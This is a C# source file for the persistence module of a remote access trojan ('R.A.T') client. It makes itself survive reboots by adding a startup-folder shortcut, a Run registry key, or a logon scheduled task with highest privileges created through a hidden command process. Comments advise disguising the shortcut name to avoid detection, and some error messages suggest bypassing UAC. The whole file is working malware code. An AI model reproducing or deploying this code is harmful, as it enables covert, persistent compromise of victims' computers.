﻿#undef EnableAutoBypass
#undef HideWindow
using Microsoft.Win32; //For registry operations
using System; // For basic system functions
using System.Diagnostics; //For process management
using System.IO; //For file operations
using System.Windows.Forms; //For form fucntions

/// <summary>
/// The R.A.T Client
/// </summary>
namespace TutClient
{
    /// <summary>
    /// The UAC / Persistence module
    /// </summary>
    public class UAC
    {
        /// <summary>
        /// Create a new shortcut file
        /// </summary>
        /// <param name="targetFile">The shortcut file's path</param>
        /// <param name="linkedFile">The file to point the shortcut to</param>
        private void CreateShortcut(string targetFile, string linkedFile)
        {
            try
            {
                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshRuntimeLibrary.IWshShell_Class(); //Get a new shell
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)wsh.CreateShortcut(targetFile); //Create the shortcut object
                shortcut.TargetPath = linkedFile; //Set the target path
                shortcut.WorkingDirectory = Application.StartupPath; //Set the working directory important!!
                shortcut.Save(); //Save the object (write to disk)
                //Console.WriteLine("Shortcut created");
            }
            catch (Exception ex) //Failed to create shortcut
            {
                Console.WriteLine("Ошибка создания ярлыка: " + ex.Message);
            }
        }

        /// <summary>
        /// The methods to use when probing statup
        /// </summary>
        public enum ProbeMethod
        {
            /// <summary>
            /// Use the startup folder
            /// </summary>
            StartUpFolder,
            /// <summary>
            /// Use the registry
            /// </summary>
            Registry,
            /// <summary>
            /// Use the TaskScheduler
            /// </summary>
            TaskScheduler
        }

        /// <summary>
        /// Probe the startup
        /// </summary>
        /// <param name="pm">The mthod to use</param>
        public void ProbeStart(ProbeMethod pm)
        {
            if (pm == ProbeMethod.StartUpFolder) //Probe starup folder
            {
                string suFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup); //Get the path of the startup folder
                string linkFile = suFolder + "\\" + "client.lnk"; //Be creative if you want to get away with it :)
                if (!File.Exists(linkFile)) CreateShortcut(linkFile, Application.ExecutablePath); //Create the new link file
            }
            else if (pm == ProbeMethod.Registry) //Probe the registry
            {
                if (!IsAdmin()) //Check if client is admin
                {
                    //Report error to the server
                    Program.ReportError(Program.ErrorType.ADMIN_REQUIRED, "Не удалось проверить реестр", "R.A.T не запущен от имени администратора! Вы можете попробовать обойти uac или использовать метод папки автозагрузки!");
                    return; //Return
                }
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true); //Get the usual registry key
                if (key.GetValue("tut_client") != null) key.DeleteValue("tut_client", false); //Check and remove value
                key.SetValue("tut_client", Application.ExecutablePath); //Add the new value
                //Close and dispose the key
                key.Close();
                key.Dispose();
            }
            else if (pm == ProbeMethod.TaskScheduler) //Probe TaskScheduler
            {
                if (!IsAdmin()) //Check if client is admin
                {
                    //Report error to the server
                    Program.ReportError(Program.ErrorType.ADMIN_REQUIRED, "Не удалось проверить планировщик задач", "R.A.T не запущен от имени администратора! Вы можете попробовать обойти uac или использовать метод папки автозагрузки!");
                    return; //Return
                }
                Process deltask = new Process(); //Delete previous task
                Process addtask = new Process(); //Create the new task
                deltask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
                deltask.StartInfo.Arguments = "/c schtasks /Delete tut_client /F"; //Set tasksch command
                deltask.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; //Hidden process
                deltask.Start(); //Delete the task
                deltask.WaitForExit(); //Wait for it to finish
                //Console.WriteLine("Delete Task Completed");
                addtask.StartInfo.FileName = "cmd.exe"; //Execute the cmd
                addtask.StartInfo.Arguments = "/c schtasks /Create /tn tut_client /tr \"" + Application.ExecutablePath + "\" /sc ONLOGON /rl HIGHEST"; //Set tasksch command
                addtask.Start(); //Add the new task
                addtask.WaitForExit(); //Wait for it to finish
                //Console.WriteLine("Task created successfully!");
            }
        }

        /// <summary>
        /// Check if client is running elevated
        /// </summary>
        /// <returns>True if client is elevated, otherwise false</returns>
        public bool IsAdmin()
        {
            System.Security.Principal.WindowsIdentity identity = System.Security.Principal.WindowsIdentity.GetCurrent(); //Get my identity
            System.Security.Principal.WindowsPrincipal principal = new System.Security.Principal.WindowsPrincipal(identity); //Get my principal
            return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); //Check if i'm an elevated process
        }

        public override string ToString()
        {
            return base.ToString();
        }

        public override bool Equals(object obj)
        {
            return base.Equals(obj);
        }

        public override int GetHashCode()
        {
            return base.GetHashCode();
        }
    }
}